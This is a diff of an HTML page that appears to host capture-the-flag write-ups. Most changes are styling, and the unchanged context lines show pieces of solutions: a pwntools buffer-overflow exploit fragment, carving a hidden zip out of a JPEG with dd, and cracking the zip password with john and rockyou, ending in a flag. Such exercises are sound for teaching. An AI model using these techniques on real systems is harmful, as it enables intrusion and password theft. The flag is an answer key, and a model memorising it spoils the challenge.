@@ -1,31 +1,31 @@
 <html>
-<head>
+	<head>
 	<meta charset="UTF-8">
 	<meta name="description" content="quackland.tk - under construction">
 	<meta name="author" content="quackland.tk">
-	<link rel="stylesheet" href="/styles/default.css">
-	<script src="/js/highlight.min.js"></script>
+	<link rel="stylesheet" href="/styles/dracula.css">
+	<script src="/js/highlight.pack.js"></script>
 	<script>hljs.highlightAll();</script>
 	<title>quackland.kr</title>
 
 	<style type="text/css">
 		body {
 			background-color:black;
-			color:#948DB8;
-			font-family:monospace;
-			text-align:center;
+			color:white;
+			font-family:hack;
+			padding-left: 137px;
+			padding-right: 137px;
 		}
-		code {
-			position: center;
-			color: white;
+		h1 {
+			font-size: 40px;
+			color:#81cc4b;
+			text-align: center;
 		}
-		.bar {
-			position: fixed;
-			top: 10%;
-			right: 10%;
-			color: white;
+		h2 {
+			font-size: 30px;
+			color:#81cc4b;
 		}
-		a { color: inherit; }
+		a { color: white; }
 		.hello {
 			position: fixed;
 			top: 50%;
@@ -56,7 +56,6 @@
 <p><img src="https://i.imgur.com/VcWQQvr.png" /></p>
 <p>The function seems simple: we overflow the buffer s (i.e rbp-0x20 [check top of the function]). So after we give 0x20 bytes we will get to rbp and then rip. Thus our exploit will look like this:-</p>
 <pre><code>from pwn import *
-
 
 padding = b&#39;i&#39;*0x20
 flag = p64(0x4011b6)
@@ -134,7 +133,7 @@ p.interactive()</code></pre>
 <p>So let’s extract it. The jpg files usually end with FFD9 byte. We extract everything after that in file called foo.</p>
 <pre><code>dd if=anime.jpg of=tmp bs=1 skip=362196</code></pre>
 <p>Here skip the address of the line where we found the ending byte in int (0x586D4).</p>
-<h6 id="note">Note</h6>
+<h3 id="note">Note</h3>
 <div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">i</span> am using ghex and my hex editor.</span></code></pre></div>
 <p><img src="https://i.imgur.com/TATw0ud.png" /></p>
 <p>After cleaning up the file by removing extra bytes that may have been copied and fixing the magic byte of the zip file (i.e 50 4B). And we have a clean zip file.</p>
@@ -149,4 +148,3 @@ p.interactive()</code></pre>
 <span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">john</span> <span class="at">--wordlist</span><span class="op">=</span>~/rockyou.txt hash</span></code></pre></div>
 <p>The password is naruto and we get the flag.</p>
 <p>codefest{y0u_4r3_g00d_4t_m4g1c_byt35}</p>
-<body>
